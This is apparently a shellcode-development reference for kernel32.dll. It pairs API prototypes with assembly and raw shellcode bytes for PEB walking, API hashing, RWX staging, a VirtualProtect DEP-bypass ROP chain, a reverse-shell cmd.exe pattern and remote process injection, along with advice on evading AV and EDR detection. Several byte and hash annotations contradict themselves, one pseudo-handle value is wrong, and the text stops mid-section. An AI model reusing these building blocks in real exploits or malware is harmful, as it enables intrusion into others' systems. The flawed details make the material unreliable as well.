# kernel32.dll — Shellcode API Reference

**Library:** `kernel32.dll`
**Base address:** Varies by OS version and ASLR; always loaded in every Win32 process.
**Purpose in shellcode:** Provides the foundational Win32 API surface — memory allocation, process/thread management, library loading, and memory copying. Because `kernel32.dll` is mapped into every Windows process at startup (before ASLR can scatter it far), it is the first DLL shellcode resolves during the PEB walk.

---

## Table of Contents

1. [VirtualAlloc](#virtualalloc)
2. [VirtualProtect](#virtualprotect)
3. [CreateThread](#createthread)
4. [WaitForSingleObject](#waitforsingleobject)
5. [LoadLibraryA](#loadlibrarya)
6. [GetProcAddress](#getprocaddress)
7. [CreateProcessA](#createprocessa)
8. [TerminateProcess](#terminateprocess)
9. [RtlMoveMemory](#rtlmovememory)
10. [HeapAlloc / HeapFree](#heapalloc--heapfree)
11. [GetCurrentProcess](#getcurrentprocess)
12. [OpenProcess / WriteProcessMemory](#openprocess--writeprocessmemory)
13. [Calling Convention Summary](#calling-convention-summary)
14. [String Handling](#string-handling)
15. [Handle Values](#handle-values)
16. [ROR-13 Hash Quick Reference](#ror-13-hash-quick-reference)

---

## Background: How Shellcode Finds kernel32

Before any of these functions can be called, shellcode must locate `kernel32.dll` in memory and parse its export table. The standard technique uses the Process Environment Block (PEB).

### PEB Walk (x86)

```nasm
; --- Step 1: locate kernel32 base via PEB ---
xor  eax, eax
mov  eax, fs:[eax+0x30]     ; EAX = PEB
mov  eax, [eax+0x0C]        ; EAX = PEB.Ldr (PEB_LDR_DATA*)
mov  eax, [eax+0x14]        ; EAX = InMemoryOrderModuleList.Flink (first entry)
mov  eax, [eax]             ; skip ntdll (second entry)
mov  eax, [eax]             ; EAX = kernel32 entry
mov  eax, [eax+0x10]        ; EAX = DllBase (kernel32 base address)
```

### Export Table Parsing

Once the base is known, shellcode walks the IMAGE_EXPORT_DIRECTORY, computing a ROR-13 hash of each exported function name and comparing it to a precomputed target hash. This avoids embedding readable string names (a common AV signature) and is resilient to minor export table reordering.

```python
# Python: compute ROR-13 hash for a function name
def ror13(name: str) -> int:
    h = 0
    for c in name + '\x00':
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

print(hex(ror13("VirtualAlloc")))   # 0x97bc257 (note: no leading zeros)
```

---

## VirtualAlloc

### C Prototype

```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,        // preferred base address (NULL = OS chooses)
    SIZE_T dwSize,           // number of bytes to allocate
    DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE = 0x3000
    DWORD  flProtect         // PAGE_EXECUTE_READWRITE = 0x40
);
```

**Header:** `<windows.h>` | **Import lib:** `Kernel32.lib`
**Returns:** `LPVOID` — base address of the allocated region on success; `NULL` on failure.
**ROR-13 hash:** `0x97BC257`
**Bad characters in hash:** None (`\x02`, `\x57`, `\xBC`, `\x97` — all printable-safe; `\x00` is *not* present).

### Purpose

`VirtualAlloc` reserves and/or commits a region of virtual address space and assigns it a protection mask. In shellcode context it is used to:

- Stage a second-stage payload in a freshly allocated RWX region.
- Avoid writing into the stack (which may trigger Data Execution Prevention if `NX` is enforced on the stack).
- Allocate aligned memory before decrypting an XOR-encoded payload in-place.

The most common call uses `lpAddress = NULL`, `flAllocationType = 0x3000` (`MEM_COMMIT | MEM_RESERVE`), and `flProtect = 0x40` (`PAGE_EXECUTE_READWRITE`), bypassing DEP entirely for the allocated page.

### Key Parameters

| Parameter | Type | Typical shellcode value | Notes |
|---|---|---|---|
| `lpAddress` | `LPVOID` | `NULL` (0x00000000) | NULL = bad char; work around with `xor eax,eax; push eax` |
| `dwSize` | `SIZE_T` | Stage-2 size | Push exact length or a round value like `0x1000` |
| `flAllocationType` | `DWORD` | `0x3000` | `MEM_COMMIT (0x1000) \| MEM_RESERVE (0x2000)` |
| `flProtect` | `DWORD` | `0x40` | `PAGE_EXECUTE_READWRITE` — no bad chars |

### x86 Assembly Push Sequence (stdcall — args pushed right-to-left)

```nasm
; VirtualAlloc(NULL, 0x400, 0x3000, 0x40)
push 0x40           ; flProtect = PAGE_EXECUTE_READWRITE
push 0x3000         ; flAllocationType = MEM_COMMIT|MEM_RESERVE
push 0x400          ; dwSize = 1024 bytes
xor  eax, eax
push eax            ; lpAddress = NULL (avoids 0x00 byte in instruction stream)
call [VirtualAlloc_ptr]

; EAX now holds the RWX buffer address
mov  esi, eax       ; save for later use
```

### Shellcode Usage Pattern

1. Resolve `VirtualAlloc` via ROR-13 PEB walk.
2. Allocate RWX buffer sized for the second stage.
3. Receive second stage over network (e.g., `recv()` loop) into `ESI`.
4. `jmp esi` or `call esi` to transfer control.

```python
# Python shellcode builder fragment
import struct

def pack32(v):
    return struct.pack("<I", v)

# Assumes EBX = resolved VirtualAlloc address
virtualalloc_call = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax       ; lpAddress = NULL
    b"\x68\x00\x04\x00\x00" # push 0x400    ; dwSize
    b"\x68\x00\x30\x00\x00" # push 0x3000   ; flAllocationType
    b"\x6a\x40"             # push 0x40     ; flProtect
    b"\xff\xd3"             # call ebx      ; VirtualAlloc
    b"\x89\xc6"             # mov esi, eax  ; save buffer ptr
)
```

> **Note on the NULL lpAddress:** The `push eax` after `xor eax, eax` emits `0x50`, avoiding a literal `\x00\x00\x00\x00` DWORD that most bad-character filters reject.

---

## VirtualProtect

### C Prototype

```c
BOOL VirtualProtect(
    LPVOID lpAddress,       // start of the region to change
    SIZE_T dwSize,          // size in bytes
    DWORD  flNewProtect,    // new protection mask (e.g., 0x40 = RWX)
    PDWORD lpflOldProtect   // pointer to DWORD that receives old protection
);
```

**Returns:** Non-zero (TRUE) on success; 0 on failure.
**ROR-13 hash:** `0xE857500D`
**Bad characters in hash:** `\x0D` — carriage return, commonly a bad char. Address this by finding a version of the gadget or call target that doesn't embed this byte in the resolved address, or by computing the function pointer at runtime and storing it in a register.

### Purpose

`VirtualProtect` changes the memory protection on a committed region. It is the primary target of **DEP-bypass ROP chains** on Windows x86 because:

- It is exported by `kernel32.dll` (always loaded, stable offset within a version).
- After a successful call, the shellcode region becomes executable and control can be passed to it.
- The calling convention (`__stdcall`) allows a clean ROP transition.

### The PUSHAD Trick

In classic DEP-bypass exploits (e.g., ASLR-disabled or leaked-base scenarios), a common technique is to pre-load the CPU registers with the desired `VirtualProtect` arguments, then execute a `PUSHAD` gadget followed by a call to `VirtualProtect`. `PUSHAD` pushes all eight general-purpose registers in order:

```
PUSHAD pushes: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI  (high→low addresses)
```

This means after `PUSHAD`, the stack looks like (ESP points to EDI's value):

```
[ESP+0x00] = EDI   → mapped to: (discarded; return address)
[ESP+0x04] = ESI   → maps to: lpAddress  (pointer to shellcode start)
[ESP+0x08] = EBP   → maps to: dwSize     (shellcode region size, e.g. 0x201)
[ESP+0x0C] = ESP   → maps to: flNewProtect (but this is the *live* ESP value)
[ESP+0x10] = EBX   → maps to: lpflOldProtect (pointer to writable location)
```

To exploit this cleanly, set up registers as follows:

```
EDI = ROP_NOP gadget address (used as the "return address" after VirtualProtect)
ESI = shellcode base address
EBP = shellcode size (e.g., 0x201)
EBX = writable .data address (receives old protection value)
EDX = 0x40  (PAGE_EXECUTE_READWRITE) — actually placed at [ESP+0x0C] via ESP
```

The exact register-to-parameter mapping depends on how `ESP` value aligns post-`PUSHAD`. The exploit author must account for the `ESP` value that gets pushed as `flNewProtect`; a separate fixup gadget (`ADD ESP, X`) is often needed.

```nasm
; --- ROP chain fragment (conceptual, no ASLR) ---
rop_chain:
    dd gadget_pop_edi          ; pop edi ; ret
    dd rop_nop                 ; → EDI = ROP NOP (return address for VirtualProtect)
    dd gadget_pop_esi
    dd shellcode_base          ; → ESI = lpAddress
    dd gadget_pop_ebp
    dd 0x00000201              ; → EBP = dwSize (513 bytes)
    dd gadget_pop_ebx
    dd writable_ptr            ; → EBX = lpflOldProtect
    dd gadget_pop_edx
    dd 0x00000040              ; → EDX = 0x40 (PAGE_EXECUTE_READWRITE)
    ; ... fixup ESP for flNewProtect ...
    dd gadget_pushad           ; pushad ; ret
    dd virtualprotect_addr     ; VirtualProtect is now called
```

### x86 Direct Call (non-ROP)

```nasm
; VirtualProtect(shellcode_ptr, 0x1000, 0x40, writable_scratch)
lea  eax, [writable_scratch]
push eax            ; lpflOldProtect
push 0x40           ; flNewProtect = PAGE_EXECUTE_READWRITE
push 0x1000         ; dwSize
push esi            ; lpAddress = shellcode pointer
call [VirtualProtect_ptr]
```

---

## CreateThread

### C Prototype

```c
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes, // NULL = default
    SIZE_T                  dwStackSize,        // 0 = default
    LPTHREAD_START_ROUTINE  lpStartAddress,     // pointer to shellcode
    LPVOID                  lpParameter,        // NULL
    DWORD                   dwCreationFlags,    // 0 = run immediately
    LPDWORD                 lpThreadId          // NULL or writable ptr
);
```

**Returns:** `HANDLE` to the new thread on success; `NULL` on failure.
**ROR-13 hash:** `0x0935FF15`
**Bad characters in hash:** `\x00` byte in the high word — `0x0935FF15`. No null bytes. `\x15` is a NAK control character (often a bad char in SMTP exploits). The full DWORD `0x0935FF15` has no null bytes.

### Purpose

`CreateThread` launches shellcode in a new thread within the current process. This is the canonical way to hand off from a staged payload to the final shellcode without worrying about the original thread's stack frame or return address.

### x86 Push Sequence

```nasm
; CreateThread(NULL, 0, shellcode_ptr, NULL, 0, NULL)
xor  eax, eax
push eax            ; lpThreadId = NULL
push eax            ; dwCreationFlags = 0
push eax            ; lpParameter = NULL
push esi            ; lpStartAddress = shellcode ptr (previously saved)
push eax            ; dwStackSize = 0
push eax            ; lpThreadAttributes = NULL
call [CreateThread_ptr]
mov  ebx, eax       ; save thread HANDLE for WaitForSingleObject
```

### Shellcode Usage Pattern

```
1. VirtualAlloc  → RWX buffer → ESI
2. recv/memcpy   → populate buffer at ESI
3. CreateThread  → launch thread at ESI → HANDLE in EBX
4. WaitForSingleObject(EBX, INFINITE)
5. TerminateProcess(-1, 0)
```

---

## WaitForSingleObject

### C Prototype

```c
DWORD WaitForSingleObject(
    HANDLE hHandle,          // thread/process/event HANDLE
    DWORD  dwMilliseconds    // timeout; INFINITE = 0xFFFFFFFF
);
```

**Returns:** `WAIT_OBJECT_0` (0) when signalled; `WAIT_TIMEOUT` (0x102) on timeout; `WAIT_FAILED` (0xFFFFFFFF) on error.
**ROR-13 hash:** `0xB3F5E90D`
**Bad characters in hash:** `\x0D` — carriage return, same concern as `VirtualProtect`.

### Purpose

After `CreateThread`, the main thread must not exit (which would terminate the process). `WaitForSingleObject` with `INFINITE` blocks the calling thread until the shellcode thread completes.

### x86 Push Sequence

```nasm
; WaitForSingleObject(hThread, INFINITE)
push 0xFFFFFFFF     ; dwMilliseconds = INFINITE
push ebx            ; hHandle = thread HANDLE (from CreateThread)
call [WaitForSingleObject_ptr]
```

> **Note:** `0xFFFFFFFF` does not contain null bytes, but if `\xFF` is a bad character (e.g., some CGI-based targets), encode the DWORD and fix it up at runtime:
> ```nasm
> xor  eax, eax
> dec  eax          ; EAX = 0xFFFFFFFF
> push eax
> ```

---

## LoadLibraryA

### C Prototype

```c
HMODULE LoadLibraryA(
    LPCSTR lpLibFileName    // pointer to null-terminated ANSI DLL name
);
```

**Returns:** `HMODULE` (base address of the loaded DLL) on success; `NULL` on failure.
**ROR-13 hash:** `0xEC0E4E8E`
**Bad characters in hash:** None problematic in common contexts. `\x8E` is high-byte; verify target encoding.

### Purpose

`LoadLibraryA` forces the loader to map a DLL into the process. In shellcode it is most commonly used to load `ws2_32.dll` before calling `WSAStartup`, `WSASocketA`, and `connect` for a reverse shell.

### String Construction on the Stack

Pushing string arguments requires encoding the string as DWORDs in reverse byte order:

```nasm
; Push "ws2_32\x00" onto stack
; "ws2_32\0" = 77 73 32 5F 33 32 00 (+ padding)
; Reversed in 4-byte chunks: "2_sw" = 0x325F7377, "32\0\0" = 0x00003233
xor  eax, eax
push eax            ; null terminator + padding (avoids 0x00 problem: use sub esp,4; mov byte [esp], 0)
push 0x32335F32     ; "2_32"  (little-endian: bytes 32 5F 33 32 stored as 32 33 5F 32? verify)
push 0x73773200     ; has null byte — PROBLEMATIC. Fix:
```

A cleaner approach for null-byte-free shellcode:

```nasm
; Null-byte-free "ws2_32" on stack
sub  esp, 8
mov  byte [esp+0], 'w'
mov  byte [esp+1], 's'
mov  byte [esp+2], '2'
mov  byte [esp+3], '_'
mov  byte [esp+4], '3'
mov  byte [esp+5], '2'
mov  byte [esp+6], 0    ; null terminator — this IS a null byte in the data,
                         ; but it's a store, not embedded in the instruction stream
mov  esp_save, esp       ; (conceptual — use LEA to get pointer)
lea  eax, [esp]
push eax                 ; lpLibFileName = pointer to "ws2_32\0"
call [LoadLibraryA_ptr]
```

Alternatively, XOR-encode the string and decode it into a stack buffer before the call.

### x86 Push Sequence (compact version with encoded string)

```nasm
; Encode "ws2_32\0" as 0x77733232 XOR 0x01010101 = 0x76723131; decode at runtime
; (Exact encoding depends on available registers and bad chars)
mov  eax, 0x76723131    ; encoded "ws2_32\0"
xor  eax, 0x01010101    ; decoded
push eax
push 0x5F              ; '_'  (single byte push — sign extends to 0xFFFFFF5F; careful!)
; ... better to push full DWORDs ...
```

### Practical Pattern

```python
# Python shellcode builder: LoadLibraryA("ws2_32")
# Assumes EDI = resolved LoadLibraryA address

load_ws2 = (
    b"\x31\xc0"                 # xor eax, eax
    b"\x50"                     # push eax           ; string terminator
    b"\x68\x77\x73\x32\x5f"     # push "ws2_"
    b"\x68\x00\x33\x32\x00"     # PROBLEMATIC — has nulls; encode differently
)
# Null-byte-free version: XOR each DWORD with a key, push key first, pop/xor at runtime
```

---

## GetProcAddress

### C Prototype

```c
FARPROC GetProcAddress(
    HMODULE hModule,     // DLL base address
    LPCSTR  lpProcName   // function name string OR ordinal (LOWORD of pointer)
);
```

**Returns:** Pointer to the exported function; `NULL` on failure.
**ROR-13 hash:** `0x7802F749`
**Bad characters in hash:** `\x49` ('I'), `\xF7` — typically not problematic.

### Why Shellcode Typically Avoids GetProcAddress

Custom shellcode almost universally uses **hash-based PEB export walking** rather than `GetProcAddress` because:

1. **Detection surface:** A call to `GetProcAddress` with a readable string argument ("VirtualAlloc", "WSASocketA") is a strong behavioral indicator that AV/EDR products flag.
2. **String embedding:** Embedding function name strings as literal data increases entropy analysis hits and exposes intent.
3. **Dependency chain:** Using `GetProcAddress` requires first resolving `GetProcAddress` itself (circular problem for the first resolution).
4. **Performance:** For shellcode resolving 10–20 functions, a custom PEB walk that avoids `GetProcAddress` entirely is minimal overhead.

`GetProcAddress` *is* sometimes used in second-stage payloads (e.g., Meterpreter reflective DLL injection) where a richer runtime is already established and stealth is less critical.

### Ordinal Lookup

To look up by ordinal rather than name, cast the ordinal to `LPCSTR`:

```c
FARPROC fn = GetProcAddress(hModule, (LPCSTR)1);  // ordinal 1
```

In assembly: `push 1` then `push hModule` — the low word of the pointer (1) is treated as an ordinal when the high word is 0.

---

## CreateProcessA

### C Prototype

```c
BOOL CreateProcessA(
    LPCSTR                lpApplicationName,   // NULL (use lpCommandLine)
    LPSTR                 lpCommandLine,        // "cmd.exe\0" or full path
    LPSECURITY_ATTRIBUTES lpProcessAttributes, // NULL
    LPSECURITY_ATTRIBUTES lpThreadAttributes,  // NULL
    BOOL                  bInheritHandles,      // TRUE (1) for socket inheritance
    DWORD                 dwCreationFlags,      // 0
    LPVOID                lpEnvironment,        // NULL
    LPCSTR                lpCurrentDirectory,   // NULL
    LPSTARTUPINFOA        lpStartupInfo,        // pointer to STARTUPINFOA struct
    LPPROCESS_INFORMATION lpProcessInformation  // pointer to PROCESS_INFORMATION struct
);
```

**Returns:** Non-zero (TRUE) on success; 0 on failure.
**ROR-13 hash:** `0x16B3FE72`
**Bad characters in hash:** None common.

### STARTUPINFOA Layout (x86, 68 bytes)

```c
typedef struct _STARTUPINFOA {
    DWORD  cb;            // +0x00: sizeof(STARTUPINFOA) = 0x44 = 68
    LPSTR  lpReserved;    // +0x04: NULL
    LPSTR  lpDesktop;     // +0x08: NULL
    LPSTR  lpTitle;       // +0x0C: NULL
    DWORD  dwX;           // +0x10: 0
    DWORD  dwY;           // +0x14: 0
    DWORD  dwXSize;       // +0x18: 0
    DWORD  dwYSize;       // +0x1C: 0
    DWORD  dwXCountChars; // +0x20: 0
    DWORD  dwYCountChars; // +0x24: 0
    DWORD  dwFillAttribute; // +0x28: 0
    DWORD  dwFlags;       // +0x2C: STARTF_USESTDHANDLES = 0x100
    WORD   wShowWindow;   // +0x30: SW_HIDE = 0
    WORD   cbReserved2;   // +0x32: 0
    LPBYTE lpReserved2;   // +0x34: NULL
    HANDLE hStdInput;     // +0x38: socket HANDLE
    HANDLE hStdOutput;    // +0x3C: socket HANDLE
    HANDLE hStdError;     // +0x40: socket HANDLE
} STARTUPINFOA;           // Total: 0x44 bytes
```

### PROCESS_INFORMATION Layout (x86, 16 bytes)

```c
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;    // +0x00: receives process HANDLE
    HANDLE hThread;     // +0x04: receives thread HANDLE
    DWORD  dwProcessId; // +0x08: PID
    DWORD  dwThreadId;  // +0x0C: TID
} PROCESS_INFORMATION;  // Total: 0x10 bytes
```

### Shellcode Pattern — Reverse Shell cmd.exe

The classic shellcode pattern for a reverse TCP shell:

1. Connect socket (`WSASocketA` + `connect`).
2. Build `STARTUPINFOA` on the stack with `hStdInput/Output/Error` set to the socket.
3. Set `dwFlags = STARTF_USESTDHANDLES (0x100)` so the spawned process inherits the socket.
4. Call `CreateProcessA("cmd.exe", ...)`.

```nasm
; --- Build STARTUPINFOA on stack (grows downward) ---
; ESI = connected socket HANDLE
; Reserve space on stack for PROCESS_INFORMATION (0x10 bytes)
sub  esp, 0x10          ; space for PROCESS_INFORMATION
mov  edi, esp           ; EDI = &PROCESS_INFORMATION (lpProcessInformation)

; Reserve space for STARTUPINFOA (0x44 bytes)
sub  esp, 0x44
mov  ebp, esp           ; EBP = &STARTUPINFOA (lpStartupInfo)

; Zero the entire STARTUPINFOA
xor  eax, eax
mov  ecx, 0x11          ; 0x44 / 4 = 17 DWORDs
rep  stosd              ; note: stosd uses EDI — save/restore or use different approach

; Actually zero with explicit stores (safer):
push edi                ; save PROCESS_INFORMATION ptr
xor  eax, eax
mov  ecx, 0x44
lea  edi, [ebp]
rep  stosb              ; zero STARTUPINFOA
pop  edi

; Fill required fields
mov  [ebp+0x00], dword 0x44    ; cb = sizeof(STARTUPINFOA)
mov  [ebp+0x2C], dword 0x100   ; dwFlags = STARTF_USESTDHANDLES
mov  [ebp+0x38], esi            ; hStdInput  = socket
mov  [ebp+0x3C], esi            ; hStdOutput = socket
mov  [ebp+0x40], esi            ; hStdError  = socket

; --- Push "cmd\0" string onto stack ---
xor  eax, eax
push eax                ; null terminator
push 0x646d63           ; "cmd" in little-endian (0x636d64 reversed = 0x646d63... verify)
; Correct: "cmd\0" = 0x00646d63 — problematic (null). Use:
mov  eax, 0xFF646D63
xor  al, 0xFF           ; EAX[0] = 0x00 → "cmd\0" (only if other bytes don't conflict)
; Better: build on stack byte by byte (see LoadLibraryA notes)
mov  ecx, esp           ; ECX = pointer to "cmd\0" string

; --- Call CreateProcessA ---
push edi                ; lpProcessInformation
push ebp                ; lpStartupInfo
xor  eax, eax
push eax                ; lpCurrentDirectory = NULL
push eax                ; lpEnvironment = NULL
push eax                ; dwCreationFlags = 0
push 1                  ; bInheritHandles = TRUE
push eax                ; lpThreadAttributes = NULL
push eax                ; lpProcessAttributes = NULL
push ecx                ; lpCommandLine = "cmd\0"
push eax                ; lpApplicationName = NULL
call [CreateProcessA_ptr]
```

### lpApplicationName vs lpCommandLine

- Use `lpApplicationName = NULL` and put the full command in `lpCommandLine`. This is shorter and avoids needing a fully-qualified path.
- `lpCommandLine` is tokenized at the first space: `"cmd.exe /k whoami"` works directly.
- With `lpApplicationName` set, it must be a valid executable path; `lpCommandLine` becomes argument[0..n].

### dwCreationFlags Values

| Flag | Value | Use |
|---|---|---|
| `0` | `0x00000000` | Default; process visible |
| `CREATE_NO_WINDOW` | `0x08000000` | Hide console window (use with `STARTF_USESHOWWINDOW`) |
| `DETACHED_PROCESS` | `0x00000008` | No console |

---

## TerminateProcess

### C Prototype

```c
BOOL TerminateProcess(
    HANDLE hProcess,     // target process HANDLE; -1 = current process
    UINT   uExitCode     // exit code (typically 0)
);
```

**Returns:** Non-zero (TRUE) on success; 0 on failure (but on self-termination, never returns).
**ROR-13 hash:** `0x78B5B983`
**Bad characters in hash:** `\x83` — high byte, verify against target filter.

### Purpose

After the shellcode payload completes (e.g., the cmd.exe session closes), the shellcode thread may return to an undefined address on the stack, causing an access violation that can reveal the exploit or crash the process ungracefully. `TerminateProcess(GetCurrentProcess(), 0)` provides a clean exit.

### GetCurrentProcess Pseudo-Handle

`GetCurrentProcess()` returns the value `-1` (i.e., `0xFFFFFFFF` as an unsigned 32-bit integer). This is a *pseudo-handle* — the kernel recognizes it as "the calling process" without needing a real handle lookup. Shellcode can skip calling `GetCurrentProcess()` and simply push `-1` directly:

```nasm
; TerminateProcess(-1, 0)
xor  eax, eax
push eax            ; uExitCode = 0
xor  ebx, ebx
dec  ebx            ; EBX = 0xFFFFFFFF = -1
push ebx            ; hProcess = GetCurrentProcess() pseudo-handle
call [TerminateProcess_ptr]
; Execution never reaches here
```

### Why Shellcode Needs This

Without a clean exit:

1. The thread's `lpStartAddress` returns to whatever was on the stack (usually shellcode data or garbage).
2. The CPU tries to execute that as code — likely an access violation.
3. Windows Error Reporting may launch, creating log entries and potentially notifying AV.
4. The process crash is visible to monitoring tools.

---

## RtlMoveMemory

### C Prototype

```c
VOID RtlMoveMemory(
    PVOID       Destination,  // target buffer
    const VOID *Source,       // source buffer
    SIZE_T      Length        // byte count
);
```

**Returns:** `VOID` — no return value.
**ROR-13 hash:** `0xD19E4B26`
**Bad characters in hash:** None common.

### Purpose

`RtlMoveMemory` copies `Length` bytes from `Source` to `Destination`, handling overlapping regions safely. Despite the "Rtl" prefix it is exported by `kernel32.dll` (as a forwarder to `ntdll!RtlMoveMemory`). In shellcode it is used by:

- The Portable Executable (PE) loader within reflective DLL injection to copy sections.
- Multi-stage payloads copying a decoded second stage into a `VirtualAlloc`'d buffer.

### x86 Push Sequence

```nasm
; RtlMoveMemory(dest, src, len)
push ecx            ; Length (ECX = byte count)
push esi            ; Source (ESI = input buffer)
push edi            ; Destination (EDI = VirtualAlloc'd RWX buffer)
call [RtlMoveMemory_ptr]
```

### Difference from RtlCopyMemory

`RtlCopyMemory` (a macro alias in Windows headers) is defined as `memcpy` and does *not* handle overlapping buffers. `RtlMoveMemory` is the safe version. In practice, both are forwarded to `ntdll!memmove` or equivalent. For shellcode that knows source and destination do not overlap, either is safe.

---

## HeapAlloc / HeapFree

### HeapAlloc C Prototype

```c
LPVOID HeapAlloc(
    HANDLE hHeap,    // heap HANDLE (GetProcessHeap() for default heap)
    DWORD  dwFlags,  // 0 for default; HEAP_ZERO_MEMORY = 0x8
    SIZE_T dwBytes   // bytes to allocate
);
```

### HeapFree C Prototype

```c
BOOL HeapFree(
    HANDLE hHeap,   // same heap HANDLE
    DWORD  dwFlags, // 0
    LPVOID lpMem    // pointer to previously HeapAlloc'd block
);
```

**HeapAlloc ROR-13 hash:** `0x25CF0D14`
**Bad characters in hash (HeapAlloc):** `\x0D` — carriage return. Same mitigation as `VirtualProtect` hash.

### GetProcessHeap

`GetProcessHeap()` takes no arguments and returns the `HANDLE` to the process's default heap. The return value is stable for the lifetime of the process.

```nasm
; HeapAlloc(GetProcessHeap(), 0, 0x200)
call [GetProcessHeap_ptr]   ; EAX = default heap HANDLE
push 0x200                  ; dwBytes
push 0                      ; dwFlags
push eax                    ; hHeap
call [HeapAlloc_ptr]
; EAX = pointer to allocated block (or NULL on failure)
```

### When Shellcode Uses HeapAlloc vs VirtualAlloc

| Criteria | `HeapAlloc` | `VirtualAlloc` |
|---|---|---|
| Granularity | Any size | 4 KB page granularity |
| Executable by default | No (heap is NX) | Configurable via `flProtect` |
| Typical use in shellcode | Intermediate data buffers | Second-stage executable staging |
| Fragmentation visible to AV | More (heap metadata) | Less |

Shellcode that needs a data buffer but not execution uses `HeapAlloc`; shellcode that needs to execute allocated memory uses `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`.

---

## GetCurrentProcess

### C Prototype

```c
HANDLE GetCurrentProcess(VOID);
```

**Returns:** Always returns the pseudo-handle value `-1` (`0xFFFFFFFF`).
**ROR-13 hash:** `0x1A6A8D00`
**Bad characters in hash:** `\x00` null byte in the hash value. This means if you push the hash as a DWORD for comparison in a hash-walk, you have a problem. However, the hash is only ever used internally in the resolver code — it is never pushed as a function argument.

### Why -1 Works as a Process Handle

The Windows kernel defines several *pseudo-handles*:

| Pseudo-handle | Value | Meaning |
|---|---|---|
| `GetCurrentProcess()` | `0xFFFFFFFF` (-1) | Current process |
| `GetCurrentThread()` | `0xFFFFFFFE` (-2) | Current thread |
| `GetCurrentProcessToken()` | `0xFFFFFFFE` (-6 on Vista+) | Process token |

When the kernel receives `0xFFFFFFFF` as a `HANDLE`, it interprets it as "the calling process" without a lookup in the handle table. This is why shellcode can write:

```nasm
xor  eax, eax
dec  eax            ; EAX = 0xFFFFFFFF
push eax            ; hProcess = current process pseudo-handle
```

...and never actually call `GetCurrentProcess()`.

---

## OpenProcess / WriteProcessMemory

These two functions form the foundation of **process injection** shellcode. `OpenProcess` obtains a handle to a target process; `WriteProcessMemory` writes the shellcode payload into that process's virtual memory.

### OpenProcess C Prototype

```c
HANDLE OpenProcess(
    DWORD dwDesiredAccess,  // PROCESS_ALL_ACCESS = 0x1F0FFF
    BOOL  bInheritHandle,   // FALSE = 0
    DWORD dwProcessId       // target PID (from enumeration)
);
```

**Returns:** `HANDLE` to the target process; `NULL` on failure or insufficient privileges.

### WriteProcessMemory C Prototype

```c
BOOL WriteProcessMemory(
    HANDLE  hProcess,                  // from OpenProcess
    LPVOID  lpBaseAddress,             // target address (from VirtualAllocEx)
    LPCVOID lpBuffer,                  // shellcode pointer
    SIZE_T  nSize,                     // shellcode length
    SIZE_T *lpNumberOfBytesWritten     // NULL (optional out)
);
```

**Returns:** Non-zero on success.

### Typical Injection Shellcode Pattern

```nasm
; 1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
push dword [target_pid]     ; dwProcessId
push 0                      ; bInheritHandle = FALSE
push 0x1F0FFF               ; dwDesiredAccess = PROCESS_ALL_ACCESS
call [OpenProcess_ptr]
mov  [hProcess], eax        ; save target HANDLE

; 2. VirtualAllocEx — allocate RWX page in remote process
; (VirtualAllocEx not listed above but prototype mirrors VirtualAlloc with hProcess first)
push 0x40
push 0x3000
push shellcode_len
push 0
push dword [hProcess]
call [VirtualAllocEx_ptr]
mov  [remote_addr], eax     ; remote RWX buffer address

; 3. WriteProcessMemory
push 0                      ; lpNumberOfBytesWritten = NULL
push shellcode_len
push shellcode_local_ptr
push dword [remote_addr]
push dword [hProcess]
call [WriteProcessMemory_ptr]

; 4. CreateRemoteThread — execute in target process
; ... (see ntdll.md for NtCreateThreadEx)
```

### Privilege Requirements

- `OpenProcess(PROCESS_ALL_ACCESS, ...)` requires `SeDebugPrivilege` to open processes owned by other users or SYSTEM.
- When exploiting a local privilege escalation, the shellcode may enable `SeDebugPrivilege` first via `OpenProcessToken` / `AdjustTokenPrivileges`.

---

## Calling Convention Summary

### x86 — `__stdcall` (All kernel32 exports)

| Property | Value |
|---|---|
| Argument order | Right-to-left (last arg pushed first) |
| Stack cleanup | **Callee** cleans (the called function pops args) |
| Return value (≤32-bit) | `EAX` |
| Return value (64-bit) | `EDX:EAX` (high:low) |
| Preserved registers | `EBX`, `ESI`, `EDI`, `EBP`, `ESP` |
| Scratch registers | `EAX`, `ECX`, `EDX` |
| Name decoration | `_FunctionName@ArgByteCount` (e.g., `_VirtualAlloc@16`) |

The callee-cleans convention means the `RETN N` instruction at the function's end pops the arguments from the stack. This is why shellcode does **not** need an `ADD ESP, N` after calling kernel32 functions.

### x64 — `__fastcall` (Microsoft ABI)

| Property | Value |
|---|---|
| First 4 integer args | `RCX`, `RDX`, `R8`, `R9` (in order) |
| Additional args | Right-to-left on stack (above the shadow space) |
| Shadow space | 32 bytes (0x20) reserved on stack by **caller** before every call |
| Stack cleanup | **Caller** cleans |
| Return value | `RAX` |
| Preserved registers | `RBX`, `RSI`, `RDI`, `RBP`, `RSP`, `R12`–`R15` |
| Scratch registers | `RAX`, `RCX`, `RDX`, `R8`, `R9`, `R10`, `R11` |
| Stack alignment | Must be 16-byte aligned at call instruction |

```nasm
; x64: VirtualAlloc(NULL, 0x1000, 0x3000, 0x40)
; RCX = lpAddress = 0
; RDX = dwSize = 0x1000
; R8  = flAllocationType = 0x3000
; R9  = flProtect = 0x40
; Shadow space: sub rsp, 0x20 (plus 8 for alignment if needed)

xor  rcx, rcx              ; lpAddress = NULL
mov  rdx, 0x1000           ; dwSize
mov  r8d, 0x3000           ; flAllocationType
mov  r9d, 0x40             ; flProtect
sub  rsp, 0x28             ; shadow space (0x20) + 8 for 16-byte alignment
call [VirtualAlloc_ptr]
add  rsp, 0x28
```

---

## String Handling

### ANSI vs. Wide Strings

All `kernel32.dll` functions with an `A` suffix (`CreateProcessA`, `LoadLibraryA`, `GetProcAddress`) accept null-terminated ANSI (`char*`) strings. Functions with a `W` suffix take `WCHAR*` (UTF-16LE, 2 bytes per character).

Shellcode prefers `A` functions because:
- Single-byte characters are simpler to encode and push.
- Wide strings double the embedded string size and introduce null bytes (`'c'` in UTF-16LE = `0x63 0x00`).

### Building Strings on the Stack

The canonical technique: push DWORDs in reverse byte order.

```
